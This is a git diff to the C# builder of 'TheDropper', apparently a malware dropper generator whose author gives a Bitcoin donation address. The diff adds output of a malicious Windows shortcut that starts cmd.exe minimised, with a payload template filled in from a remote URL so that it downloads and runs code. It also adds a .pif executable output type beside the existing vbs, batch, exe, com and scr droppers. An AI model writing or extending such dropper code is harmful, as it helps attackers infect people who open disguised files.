@@ -1,13 +1,14 @@
 ﻿/*
     $ TheDropper $
 
-    Author > github.com/L1ghtM4n
-    Donate > 1Lightx1nLy6DfH3W8WD1g4PugRu92M7GV (Bitcoin)
+    ^ Author github.com/L1ghtM4n
+    ^ Donate 1Lightx1nLy6DfH3W8WD1g4PugRu92M7GV (BTC)
 */
 
 using System;
 using System.IO;
 using System.Windows.Forms;
+using IWshRuntimeLibrary;
 
 using TheDropper.Generators;
 using TheDropper.Properties;
@@ -19,6 +20,7 @@ namespace TheDropper
         public Builder()
         {
             InitializeComponent();
+            comboBoxExtension.SelectedIndex = 0;
         }
 
         // Handle button click
@@ -50,7 +52,8 @@ namespace TheDropper
             // Handle
             switch (ext)
             {
-                case "vbs": {
+                case "vbs": 
+                    {
                         file = sg.Generate(Resources.vbs_payload, "vbs");
                         break;
                     }
@@ -69,6 +72,20 @@ namespace TheDropper
                         file = sg.Generate(Resources.batch_payload, "cmd");
                         break;
                     }
+                case "lnk":
+                    {
+                        Uri uri = new Uri(url);
+                        string payload = string.Format(Resources.lnk_payload, uri.AbsoluteUri, Path.GetFileName(uri.LocalPath), Path.GetFileName(uri.LocalPath));
+                        WshShell shell = new WshShell();
+                        IWshShortcut sc = (IWshShortcut)shell.CreateShortcut("output.lnk");
+                        sc.Description = "https://github.com/L1ghtM4n/TheDropper";
+                        sc.TargetPath = "%SystemRoot%\\System32\\cmd.exe";
+                        sc.Arguments = payload;
+                        sc.WindowStyle = 7;
+                        sc.Save();
+                        file = "output.lnk";
+                        break;
+                    }
                 case "exe":
                     {
                         file = eg.Generate("exe");
@@ -77,6 +94,11 @@ namespace TheDropper
                 case "com":
                     {
                         file = eg.Generate("com");
+                        break;
+                    }
+                case "pif":
+                    {
+                        file = eg.Generate("pif");
                         break;
                     }
                 case "scr":
@@ -92,9 +114,10 @@ namespace TheDropper
             }
 
             // Ok message
-            if (File.Exists(file))
+            if (System.IO.File.Exists(file))
             {
                 MessageBox.Show(this, "Saved: " + file, "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                Close();
             }
         }
 
